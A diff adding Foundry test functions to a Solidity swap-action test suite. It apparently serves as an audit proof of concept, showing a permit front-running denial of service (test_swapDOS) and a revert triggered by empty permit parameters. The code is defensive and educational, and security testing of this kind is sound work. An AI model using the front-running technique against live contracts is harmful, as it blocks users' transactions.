@@ -2,9 +2,13 @@
 pragma solidity ^0.8.19;
 
 import {Test} from "forge-std/Test.sol";
+import "forge-std/console2.sol";
+
 
 import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
+import {IERC20Permit} from "@openzeppelin/contracts/token/ERC20/extensions/draft-IERC20Permit.sol";
 import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
 
 import {PRBProxyRegistry} from "../../prb-proxy/PRBProxyRegistry.sol";
 import {PRBProxy} from "prb-proxy/PRBProxy.sol";
@@ -22,6 +26,7 @@ import {IPActionAddRemoveLiqV3} from "pendle/interfaces/IPActionAddRemoveLiqV3.s
 
 contract SwapActionTest is Test {
     using SafeERC20 for ERC20;
+    using SafeERC20 for IERC20Permit;
 
     SwapAction internal swapAction;
 
@@ -754,6 +759,126 @@ contract SwapActionTest is Test {
         assertLe(amountIn, amountInMax);
         assertEq(USDC.balanceOf(user), amountInMax - amountIn);
         assertEq(USDC.balanceOf(bob), 0);
+    }
+
+    function printBalances(address a, string memory name) view public {
+        console2.log("\n =================================================");
+        console2.log("Balances for ", name);
+        console2.log("DAI balance: ", DAI.balanceOf(a));
+        console2.log("USDC token balance: ", USDC.balanceOf(a));
+        console2.log("BOND token balance: ", BOND.balanceOf(a));
+        console2.log("=================================================\n ");
+    }
+
+    function test_swapDOS() public {
+        console2.log("\n \n swap3---------------------------------------------");   // usdc -> DAI
+        uint256 amountOut = 1_000 * 1e18; // amount out of DAI we expect
+        uint256 amountInMax = (amountOut * 102) / 100e12; // allow 2% slippage
+        deal(address(USDC), user, amountInMax);
+
+        printBalances(user, "user");
+
+
+        // get permit signature
+        uint256 deadline = block.timestamp + 100;
+        (uint8 v, bytes32 r, bytes32 s) = PermitMaker.getPermitTransferFromSignature(
+            address(USDC),
+            address(userProxy),           // spender of the permit
+            amountInMax,           // approval amount
+            NONCE,
+            deadline,
+            userPk
+        );
+
+        PermitParams memory permitParams = PermitParams({
+            approvalType: ApprovalType.PERMIT,
+            approvalAmount: amountInMax,
+            nonce: NONCE,
+            deadline: deadline,
+            v: v,
+            r: r,
+            s: s
+        });
+
+        // construct swap params
+        SwapParams memory swapParams = SwapParams({
+            swapProtocol: SwapProtocol.UNIV3,
+            swapType: SwapType.EXACT_OUT,
+            assetIn: address(USDC),
+            amount: amountOut,
+            limit: amountInMax,
+            recipient: user,
+            residualRecipient: user,
+            deadline: deadline,
+            args: DAI_USDC_PATH
+        });
+
+        console2.log("user: ", user);
+        console2.log("userProxy: ", address(userProxy));
+        console2.log("approvalAmount: ", amountInMax);
+        console2.log("deadline: ", deadline);
+
+        console2.log("allowance: ", USDC.allowance(user, address(userProxy)));
+
+        console2.log("USDC: ", address(USDC));
+        // simulate front-running of calling safePermit()
+        IERC20Permit(address(USDC)).safePermit(
+                user,
+                address(userProxy),  // spender             
+                amountInMax,
+                deadline,
+                v,
+                r,
+                s
+            );
+
+        console2.log("allowance: ", USDC.allowance(user, address(userProxy)));
+
+        vm.prank(user);
+        bytes memory response = userProxy.execute(
+            address(swapAction),
+            abi.encodeWithSelector(swapAction.transferAndSwap.selector, user, permitParams, swapParams)
+        );
+        uint256 amountIn = abi.decode(response, (uint256));
+        assertGt(amountIn, 0);
+        assertLe(amountIn, amountInMax);
+    }
+
+    function test_swap_silentFail_DOS() public {
+        console2.log("\n \n swap3---------------------------------------------");   // usdc -> DAI
+        uint256 amountOut = 1_000 * 1e18; // amount out of DAI we expect
+        uint256 amountInMax = (amountOut * 102) / 100e12; // allow 2% slippage
+        deal(address(WETH), user, amountInMax);
+
+        PermitParams memory permitParams = PermitParams({
+            approvalType: ApprovalType.PERMIT,
+            approvalAmount: amountInMax,
+            nonce: NONCE,
+            deadline: 0,
+            v: 0,
+            r: bytes32(0),
+            s: bytes32(0)
+        });
+
+        // construct swap params
+        SwapParams memory swapParams = SwapParams({
+            swapProtocol: SwapProtocol.UNIV3,
+            swapType: SwapType.EXACT_OUT,
+            assetIn: address(WETH),
+            amount: amountOut,
+            limit: amountInMax,
+            recipient: user,
+            residualRecipient: user,
+            deadline: 0,
+            args: DAI_WETH_USDC_PATH
+        });
+
+        vm.prank(user);
+        vm.expectRevert();
+        userProxy.execute(
+            address(swapAction),
+            abi.encodeWithSelector(swapAction.transferAndSwap.selector, user, permitParams, swapParams)
+        );
     }
 }
 
